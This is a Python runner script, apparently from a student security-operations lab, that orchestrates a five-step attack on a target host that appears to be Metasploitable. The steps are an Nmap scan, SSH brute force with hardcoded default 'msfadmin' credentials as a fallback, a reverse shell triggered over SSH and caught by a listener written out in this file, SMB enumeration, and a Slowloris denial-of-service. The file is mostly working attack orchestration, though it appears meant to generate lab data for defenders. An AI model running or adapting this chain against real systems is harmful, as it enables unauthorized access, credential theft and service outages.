#!/usr/bin/env python3
"""
=============================================================
  Mini SOC Project — Person A (Red Team)
  run_all.py — Master Runner semua skenario
=============================================================
  Urutan eksekusi:
    1. scenario_1_recon.py        (Nmap port scan)
    2. scenario_2_bruteforce.py   (SSH brute force)
    3. scenario_3_reverseshell.py (Reverse shell — demo mode, auto-close)
    4. scenario_4_smbenum.py      (SMB enumeration)
    5. scenario_5_slowloris.py    (Slowloris DoS)
=============================================================
"""

import time
import datetime
import sys
import socket
import threading

from scenario_1_recon       import run_recon, save_results, TARGET_IP as T1
from scenario_2_bruteforce  import run_bruteforce, TARGET_IP as T2, TARGET_PORT
from scenario_3_reverseshell import (
    trigger_reverseshell, listener_ready,
    TARGET_IP as T3, ATTACKER_IP, LISTEN_PORT,
    SSH_USER, SSH_PASS, REVSHELL_CMD,
)
from scenario_4_smbenum     import run_smb_enum,  TARGET_IP as T4
from scenario_5_slowloris   import run_slowloris,  TARGET_IP as T5, TARGET_PORT as HTTP_PORT

# ── Konfigurasi Runner ────────────────────────────────────
DELAY_BETWEEN_SCENARIOS = 5    # detik jeda antar skenario
DEMO_SHELL_TIMEOUT      = 30   # detik — reverse shell auto-close di demo mode

# Fallback jika brute force gagal (credential default Metasploitable)
FALLBACK_SSH_USER = "msfadmin"
FALLBACK_SSH_PASS = "msfadmin"
# ─────────────────────────────────────────────────────────

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║           MINI SOC PROJECT — FULL ATTACK SIMULATION          ║
║                      Person A — Red Team                     ║
║  Target  : {target:<50} ║
║  Time    : {time:<50} ║
╚══════════════════════════════════════════════════════════════╝
"""

SEPARATOR = "\n" + "═" * 62 + "\n"


def countdown(seconds: int, label: str):
    """Countdown timer antar skenario."""
    for i in range(seconds, 0, -1):
        print(f"\r[*] {label} dalam {i} detik...  ", end="", flush=True)
        time.sleep(1)
    print(f"\r[*] {label}!{' ' * 30}")


def print_step(step: int, title: str):
    print(SEPARATOR)
    print(f"  STEP {step}/5 — {title}")
    print(SEPARATOR)


def run_demo_reverseshell(listen_port: int, timeout: int = DEMO_SHELL_TIMEOUT) -> bool:
    """
    Versi non-interaktif reverse shell untuk demo runner.

    - Bind ke 0.0.0.0 (tidak perlu IP spesifik di interface)
    - Auto-close setelah `timeout` detik — tidak blokir runner
    - listener_ready di-set agar trigger_reverseshell thread bisa jalan
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(("0.0.0.0", listen_port))
    except OSError as e:
        print(f"[!] Gagal bind port {listen_port}: {e}")
        listener_ready.set()   # unblock trigger thread agar tidak hang
        return False

    server.listen(1)
    print(f"[*] Listener aktif di 0.0.0.0:{listen_port}")
    print(f"[*] Demo mode — auto-close setelah {timeout} detik\n")

    listener_ready.set()   # sinyal ke trigger_reverseshell thread

    server.settimeout(35)
    try:
        conn, addr = server.accept()
    except socket.timeout:
        print("[!] Timeout — target tidak konek dalam 35 detik.")
        server.close()
        return False

    print(f"[+] ✅ REVERSE SHELL TERKONEKSI dari {addr[0]}:{addr[1]}")
    print(f"[+] Menampilkan output selama {timeout} detik lalu auto-close...\n")
    print("═" * 54)

    conn.settimeout(2)
    start = time.time()

    try:
        while time.time() - start < timeout:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                print(data.decode(errors="replace"), end="", flush=True)
            except socket.timeout:
                pass
            except (ConnectionResetError, BrokenPipeError):
                break
    except KeyboardInterrupt:
        print("\n[*] Dihentikan manual (Ctrl+C).")
    finally:
        print(f"\n{'═' * 54}")
        print(f"[*] Demo shell ditutup (timeout {timeout}s).")
        try:
            conn.send(b"exit\n")
        except Exception:
            pass
        try:
            conn.close()
        except Exception:
            pass
        server.close()

    return True


# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(BANNER.format(target=T1, time=now))

    overall_start = time.time()

    # ── STEP 1: Reconnaissance ────────────────────────────
    print_step(1, "RECONNAISSANCE — Nmap Port Scan")
    recon_results = run_recon(T1)
    save_results(recon_results)

    countdown(DELAY_BETWEEN_SCENARIOS, "Melanjutkan ke Brute Force")

    # ── STEP 2: SSH Brute Force ───────────────────────────
    print_step(2, "CREDENTIAL ATTACK — SSH Brute Force")
    creds = run_bruteforce(T2, TARGET_PORT)

    if not creds:
        print(f"[!] Brute force tidak menemukan credential.")
        print(f"[!] Menggunakan fallback: {FALLBACK_SSH_USER}:{FALLBACK_SSH_PASS}")
        creds = {"username": FALLBACK_SSH_USER, "password": FALLBACK_SSH_PASS}

    countdown(DELAY_BETWEEN_SCENARIOS, "Melanjutkan ke Reverse Shell")

    # ── STEP 3: Reverse Shell (demo mode, non-blocking) ───
    print_step(3, "PERSISTENCE — Reverse Shell (Demo Mode)")
    print(f"[*] Credential : {creds['username']}:{creds['password']}")
    print(f"[*] Listener   : 0.0.0.0:{LISTEN_PORT} (auto-close {DEMO_SHELL_TIMEOUT}s)\n")

    # Reset event supaya bisa dipakai ulang
    listener_ready.clear()

    # SSH trigger di background thread
    trigger_thread = threading.Thread(
        target=trigger_reverseshell,
        args=(T3, TARGET_PORT, creds["username"], creds["password"], REVSHELL_CMD),
        daemon=True,
    )
    trigger_thread.start()

    # Non-blocking listener dengan auto-timeout
    run_demo_reverseshell(LISTEN_PORT, timeout=DEMO_SHELL_TIMEOUT)

    countdown(DELAY_BETWEEN_SCENARIOS, "Melanjutkan ke SMB Enumeration")

    # ── STEP 4: SMB Enumeration ───────────────────────────
    print_step(4, "DISCOVERY — SMB Share & User Enumeration")
    smb_results = run_smb_enum(T4)

    countdown(DELAY_BETWEEN_SCENARIOS, "Melanjutkan ke Slowloris DoS")

    # ── STEP 5: Slowloris DoS ─────────────────────────────
    print_step(5, "DENIAL OF SERVICE — Slowloris (Light / Demo Mode)")
    run_slowloris(T5, HTTP_PORT)

    # ── Summary ───────────────────────────────────────────
    elapsed = time.time() - overall_start
    print(SEPARATOR)
    print(f"  ✅  SIMULASI SELESAI")
    print(f"  Total waktu  : {elapsed:.1f} detik")
    print(f"  Target       : {T1}")
    print(f"  Credential   : {creds['username']}:{creds['password']}")
    print(f"  Skenario     : Recon → Brute Force → Reverse Shell → SMB Enum → Slowloris")
    print(SEPARATOR)